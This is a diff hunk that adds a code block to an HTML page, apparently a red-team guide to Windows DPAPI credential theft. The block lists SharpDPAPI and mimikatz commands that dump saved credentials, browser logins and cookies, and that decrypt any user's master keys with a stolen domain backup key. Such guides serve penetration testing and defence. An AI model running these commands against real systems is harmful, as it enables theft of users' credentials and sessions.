@@ -126,6 +126,15 @@
           </tbody>
         </table>
 
+        <pre><code># decrypt the current user's blobs (OS does the work when running as them) — SharpDPAPI
+SharpDPAPI.exe credentials        # saved creds / scheduled-task passwords
+SharpDPAPI.exe chrome             # browser logins + cookies via DPAPI
+
+# with the DOMAIN backup key (recovered as Domain Admin): decrypt ANY user's master keys
+SharpDPAPI.exe masterkeys /pvk:domain-backup.pvk
+#   mimikatz:  dpapi::masterkey /in:&lt;masterkey&gt; /pvk:domain-backup.pvk
+#              dpapi::cred /in:&lt;credential_blob&gt;</code></pre>
+
         <h2>Why it is high value</h2>
         <p>
           DPAPI loot is often credentials the victim actively uses &mdash; a saved
